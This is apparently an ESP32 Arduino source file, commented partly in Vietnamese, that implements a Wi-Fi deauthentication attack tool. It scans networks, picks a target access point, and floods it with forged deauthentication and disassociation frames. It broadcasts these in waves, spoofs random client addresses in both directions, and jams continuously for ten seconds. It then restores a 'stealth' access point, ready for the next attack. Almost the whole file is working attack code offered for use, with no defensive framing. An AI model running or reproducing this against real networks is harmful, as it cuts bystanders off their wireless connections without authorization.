#include "wifi_manager.h"
#include <WiFi.h>
#include <esp_wifi.h>

int networkCount = 0;
extern int currentChannel;

// Multiple deauth packet types cho hiệu quả tối đa
uint8_t deauthPacket[26] = {
  0xC0, 0x00,                         // Type: Deauth
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // Sequence
  0x07, 0x00                          // Reason: Class 3 frame from nonassociated
};

uint8_t disassocPacket[26] = {
  0xA0, 0x00,                         // Type: Disassociation
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // Sequence
  0x02, 0x00                          // Reason: Previous auth not valid
};

void initWiFiManager() {
  Serial.println("🔧 Advanced WiFi Manager initialized");
  
  // ✅ FIX: Sửa cách gọi promiscuous mode
  esp_wifi_set_promiscuous(true);
  
  // ✅ FIX: Xóa dòng này vì không cần thiết
  // esp_wifi_set_promiscuous_ctrl_filter(true); // Dòng này gây lỗi
  
  // Thiết lập filter cho management frames
  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  
  Serial.println("✅ Promiscuous mode enabled");
}

void scanNetworks() {
  Serial.println("🔍 Scanning for networks...");
  WiFi.mode(WIFI_STA); // Switch to STA for better scanning
  networkCount = WiFi.scanNetworks(); // ✅ FIX: Chỉ dùng 1 tham số
  WiFi.mode(WIFI_AP); // Back to AP mode
  Serial.printf("📡 Found %d networks\n", networkCount);
}

int getNetworkCount() { return networkCount; }
String getNetworkSSID(int index) { return (index < networkCount) ? WiFi.SSID(index) : ""; }
int getNetworkRSSI(int index) { return (index < networkCount) ? WiFi.RSSI(index) : 0; }
int getNetworkEncryption(int index) { return (index < networkCount) ? WiFi.encryptionType(index) : 0; }

void sendDeauthPacket(String targetSSID, int targetIndex) {
  if (targetIndex >= networkCount || targetIndex < 0) {
    Serial.println("❌ Invalid target index");
    return;
  }
  
  // Rescan để lấy thông tin mới nhất
  WiFi.mode(WIFI_STA);
  WiFi.scanNetworks(); // ✅ FIX: Chỉ dùng 1 tham số
  
  uint8_t* bssid = WiFi.BSSID(targetIndex);
  if (bssid == nullptr) {
    Serial.println("❌ Cannot get BSSID");
    WiFi.mode(WIFI_AP);
    return;
  }
  
  int targetChannel = WiFi.channel(targetIndex);
  
  Serial.printf("🎯 Target: %s\n", targetSSID.c_str());
  Serial.printf("📍 BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", 
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  Serial.printf("📻 Channel: %d\n", targetChannel);
  
  // CRITICAL: Switch to target channel
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);
  
  Serial.println("⚡ Starting multi-technique deauth attack...");
  
  // Technique 1: Broadcast Deauth (Ngắt tất cả clients)
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  memcpy(&deauthPacket[4], broadcast, 6);  // Dest: broadcast
  memcpy(&deauthPacket[10], bssid, 6);     // Source: AP
  memcpy(&deauthPacket[16], bssid, 6);     // BSSID: AP
  
  memcpy(&disassocPacket[4], broadcast, 6);
  memcpy(&disassocPacket[10], bssid, 6);
  memcpy(&disassocPacket[16], bssid, 6);
  
  for (int wave = 0; wave < 3; wave++) {
    Serial.printf("🌊 Wave %d/3\n", wave + 1);
    
    // Burst 1: Deauth packets
    for (int i = 0; i < 50; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      delayMicroseconds(1000);
    }
    
    // Burst 2: Disassoc packets
    for (int i = 0; i < 30; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
      delayMicroseconds(1000);
    }
    
    delay(200);
  }
  
  // Technique 2: Targeted client deauth (giả lập random clients)
  Serial.println("🎯 Targeting individual clients...");
  for (int client = 0; client < 20; client++) {
    uint8_t fakeClient[6];
    // Tạo MAC address giả cho client
    for (int j = 0; j < 6; j++) {
      fakeClient[j] = random(0, 255);
    }
    fakeClient[0] = (fakeClient[0] & 0xFE) | 0x02; // Set local bit
    
    // Deauth: AP -> Client
    memcpy(&deauthPacket[4], fakeClient, 6); // Dest: fake client
    memcpy(&deauthPacket[10], bssid, 6);     // Source: AP
    memcpy(&deauthPacket[16], bssid, 6);     // BSSID: AP
    
    for (int i = 0; i < 5; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      delayMicroseconds(500);
    }
    
    // Deauth: Client -> AP  
    memcpy(&deauthPacket[4], bssid, 6);      // Dest: AP
    memcpy(&deauthPacket[10], fakeClient, 6); // Source: fake client
    
    for (int i = 0; i < 5; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      delayMicroseconds(500);
    }
  }
  
  // Technique 3: Continuous jamming (10 seconds)
  Serial.println("📡 Continuous jamming for 10 seconds...");
  unsigned long startTime = millis();
  while (millis() - startTime < 10000) {
    // Reset to broadcast
    memcpy(&deauthPacket[4], broadcast, 6);
    memcpy(&deauthPacket[10], bssid, 6);
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
    delayMicroseconds(2000);
  }
  
  Serial.println("✅ Multi-technique deauth attack completed!");
  Serial.println("🔄 Restoring AP mode...");
  
  // Restore AP mode
  delay(500);
  WiFi.mode(WIFI_AP);
  
  // Khôi phục lại AP với hàm từ main.cpp
  extern void setupStealth();
  setupStealth();
  
  Serial.println("♻️ AP mode restored, ready for next attack");
}